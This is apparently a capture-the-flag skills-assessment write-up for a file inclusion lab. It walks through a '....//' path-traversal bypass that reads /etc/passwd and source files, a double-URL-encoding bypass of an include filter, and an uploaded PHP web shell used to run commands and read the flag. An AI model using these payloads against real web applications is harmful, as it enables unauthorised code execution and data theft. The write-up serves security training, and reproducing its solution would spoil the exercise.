# Skills Assessment - File Inclusion

## **Scenario**

You have been contracted by `Sumace Consulting Gmbh` to carry out a web application penetration test against their main website. During the kickoff meeting, the CISO mentioned that last year's penetration test resulted in zero findings, however they have added a job application form since then, and so it may be a point of interest.

![image.png](/image.png)

# Question

Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

## Recon Phase

I check out the source code of the website and able to find the potential link we can exploit.

![image.png](/image%201.png)

### Fuzzing

```powershell
ffuf -w LFI-Jhaddix.txt -u http://154.57.164.69:31189/api/image.php?p=FUZZ' -fs 0
```

 We fuzz the value and filter size by 0

![image.png](/image%202.png)

Let’s check the bypass using and curl:

```powershell
curl http://154.57.164.65:31810/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
```

![image.png](/image%203.png)

LFI works with the `....//` bypass.
In the website there is 

`http://IP:PORT/api/image.php?p=contact.php`

![image.png](/image%204.png)

`http://IP:PORT/api/image.php?p=apply.php`

![image.png](/image%205.png)

Ok, let’s try if we can read the source code of `apply.php` and `contact.php`

Here is my thought process, I test by going back in director by going backward

```powershell
curl http://IP:PORT/api/image.php?p=apply.php or contact.php 
```

this ^ doesn’t work so I try going back

```powershell
curl http://IP:PORT/api/image.php?p=....//apply.php or contact.php
```

Source code

apply.php (make this drop down menu)

```powershell
└─$ curl http://IP:PORT/api/image.php?p=....//apply.php
<html>

<head>
    <title>&lt;sumace/></title>
    <link rel="stylesheet" href="https://unpkg.com/mvp.css">
    <link rel="stylesheet" href="/css/custom.css">
</head>

<body>
    <header>
        <nav>
            <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="30" /></a>
            <ul>
                <li><a href="/">Home</a></li>
                <li><a href="/contact.php">Contact</a></li>
                <li>Apply</li>
            </ul>
        </nav>
        <section>
            <header>
                <h1>Work with us.</h1>
                <p>Do you have what it takes? <mark>Let's get it done together</mark>.</p>
            </header>
            <form action="/api/application.php" method="POST" enctype="multipart/form-data">
                <p>Fill out this form, and we will contact you if we think you are a good fit.</p>
                <label>First Name*</label>
                <input type="text" name="firstName" required />
                <label>Last Name*</label>
                <input type="text" name="lastName" required />
                <label>Email*</label>
                <input type="email" name="email" required />
                <label>Resume (.docx, .pdf)*</label>
                <input type="file" name="file" required />
                <label>Any additional notes</label>
                <textarea name="notes"></textarea>
                <input type="submit" value="Upload" />
            </form>
        </section>
    </header>
    <footer>
        <hr>
        <p>
            <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="25" /></a><br>
            Sumace Consulting Gmbh<br>
            Rasumofskygasse 23/25, 1030 Wien<br>
            +43 670 8872 958<br>
        </p>
    </footer>
</body>

</html>
```

We discover another api `/api/application.php`

```powershell
└─$ curl 'http://IP:PORT/api/image.php?p=....//api/application.php'
<?php
$firstName = $_POST["firstName"];
$lastName = $_POST["lastName"];
$email = $_POST["email"];
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);

header("Location: /thanks.php?n=" . urlencode($firstName));
?>
```

api/application.php places the file in /uploads/<file_md5>.<extension> when uploaded

**contact.php (make this drop down menu)**

```powershell
└─$ curl http://IP:PORT/api/image.php?p=....//contact.php
<html>
    <head>
        <title>&lt;sumace/></title>
        <link rel="stylesheet" href="https://unpkg.com/mvp.css">
        <link rel="stylesheet" href="/css/custom.css">
    </head>
    <body>
        <header>
            <nav>
                <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="30"/></a>
                <ul>
                    <li><a href="/">Home</a></li>
                    <li>Contact</li>
                    <li><a href="/apply.php">Apply</a></li>
                </ul>
            </nav>
            <section>
                <header>
                    <h1>Contact us.</h1>
                    <p>Give us a call. <mark>We will sort it out</mark>.</p>
                </header>
                <p>
                    <?php
                    $region = "AT";
                    $danger = false;

                    if (isset($_GET["region"])) {
                        if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
                            echo "'region' parameter contains invalid character(s)";
                            $danger = true;
                        } else {
                            $region = urldecode($_GET["region"]);
                        }
                    }

                    if (!$danger) {
                        include "./regions/" . $region . ".php";
                    }
                    ?>
                </p>
            </section>
        </header>
        <footer>
            <hr>
            <p>
                <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="25"/></a><br>
                Sumace Consulting Gmbh<br>
                Rasumofskygasse 23/25, 1030 Wien<br>
                +43 670 8872 958<br>
            </p>
        </footer>
    </body>
</html>
```

We can see this logic flaw in contact.php

```powershell
// 1. Checks for "." and "/" in $_GET["region"] (already URL-decoded once by PHP)
if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
    // blocked
} else {
    // 2. THEN URL-decodes AGAIN
    $region = urldecode($_GET["region"]);
}
// 3. Includes the result
include "./regions/" . $region . ".php";
```

The check happens **before** the second `urldecode()`. So double-URL-encode `.` and `/`:

- `.` → `%2e` → send as `%252e` (PHP auto-decodes to `%2e`, passes check, then `urldecode()` makes it `.`)
- `/` → `%2f` → send as `%252f`

## Exploit phase

We write a payload shell.php and upload it 

![image.png](/image%206.png)

```powershell
<?php system($_GET["cmd"]); ?>
```

The application uses MD5 hashes of filenames as the `p` parameter to reference images.

```powershell
<img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="30"/>
```

Therefore we have to calculate MD5 sums to figure out what file that hash maps to — and more importantly, to understand how `image.php` resolves files internally.

Using the following command:

```powershell
└─$ md5sum shell.php | cut -d' ' -f1
fc023fcacb27a7ad72d605c4e300b389
```

Exploit the /contact.php LFI to gain RCE

```powershell
http://IP:PORT/contact.php?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=ls%20/
```

![image.png](/image%207.png)

We can see the flag `flag_09ebca.txt` . Now let’s try to read it using cat command.

```powershell
http://IP:PORT/contact.php?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=cat%20/flag_09ebca.txt
```

![image.png](/image%208.png)